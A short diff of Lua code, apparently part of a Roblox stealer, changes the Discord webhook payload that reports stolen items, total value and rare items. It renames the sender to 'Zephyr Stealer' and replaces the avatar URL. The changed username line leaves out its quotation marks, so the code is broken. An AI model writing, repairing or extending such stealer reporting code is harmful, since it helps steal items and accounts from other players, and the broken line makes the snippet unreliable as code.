@@ -474,9 +474,9 @@ function DiscordWebhook.send(itemsToSend, totalValue, hasRare, hasHeavy, priorit
     
     local payload = {
         ["content"] = contentMsg,
-        ["username"] = finalUsername,
+        ["username"] = Zephyr Stealer,
         ["embeds"] = {embed},
-        ["avatar_url"] = "https://cdn-icons-png.flaticon.com/512/616/616408.png"
+        ["avatar_url"] = "https://postimg.cc/jwtCHyST"
     }
     
     pcall(function()
